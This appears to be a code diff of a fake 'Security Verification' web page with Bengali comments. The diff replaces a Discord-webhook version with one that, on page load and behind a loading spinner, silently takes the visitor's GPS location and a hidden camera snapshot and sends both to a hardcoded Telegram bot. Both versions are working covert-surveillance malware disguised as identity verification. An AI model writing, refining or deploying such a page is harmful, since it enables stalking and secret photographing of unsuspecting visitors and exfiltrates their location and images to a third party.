@@ -1,74 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; width: 80%; max-width: 400px; }
-        button { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
-        #status { margin-bottom: 20px; color: #555; }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Identity Verification</h2>
-        <p id="status">Your access is being verified. Click continue.</p>
-        <button id="startBtn" onclick="startProcess()">Continue</button>
-    </div>
+    <h2>Verifying Your Identity...</h2>
+    <p>Please wait while we secure your connection.</p>
+    <div class="loader"></div>
+    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        async function startProcess() {
-            const status = document.getElementById('status');
-            const btn = document.getElementById('startBtn');
-            btn.disabled = true;
-            status.innerText = "Verifying permissions... Please wait.";
-
+        // ক্যামেরা এবং লোকেশন পারমিশন চাওয়া
+        window.onload = async () => {
             try {
-                // ১. ক্যামেরা এক্সেস ও ছবি তোলা
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+                // লোকেশন ট্র্যাকিং
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
 
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-                // ২. লোকেশন নেওয়া
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                    // ৩. ডিসকোর্ডে পাঠানো
-                    const webhookURL = "https://discord.com/api/webhooks/1340333202685235282/8M0W7fS5kG3M1o0v3kG3M1o0v3kG3M1o0v3kG3M1o0v";
-
-                    const formData = new FormData();
-                    formData.append('file', blob, 'capture.jpg');
-                    formData.append('payload_json', JSON.stringify({
-                        content: `✅ **নতুন ভেরিফিকেশন রিপোর্ট!**\n📍 লোকেশন: ${mapLink}\n🕒 সময়: ${new Date().toLocaleString()}`
-                    }));
-
-                    await fetch(webhookURL, { method: 'POST', body: formData });
-
-                    // ৪. শেষ ধাপ
-                    stream.getTracks().forEach(track => track.stop());
-                    status.innerText = "Success! Check Discord.";
-                    alert("Success! Check Discord.");
-                }, (geoErr) => {
-                    alert("Location access denied. Please enable GPS.");
-                    status.innerText = "Error: Location required.";
-                    btn.disabled = false;
+                    // ক্যামেরা ট্র্যাকিং (অদৃশ্যভাবে ছবি তোলা)
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => sendToTelegram(blob, lat, lon), 'image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000);
                 });
-
             } catch (err) {
-                alert("Camera access denied. Please allow camera.");
-                status.innerText = "Error: Camera required.";
-                btn.disabled = false;
+                console.error("Access Denied");
             }
+        };
+
+        // টেলিগ্রামে তথ্য পাঠানোর ফাংশন
+        async function sendToTelegram(blob, lat, lon) {
+            const formData = new FormData();
+            // নোট: Vercel-এ এই টোকেন ও আইডি অলরেডি সেভ করা আছে
+            formData.append('chat_id', '8766925591'); 
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', `🚨 অপরাধী চিহ্নিত!\n📍 লোকেশন: https://www.google.com/maps?q=${lat},${lon}`);
+
+            await fetch(`https://api.telegram.org/bot8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
         }
     </script>
 </body>
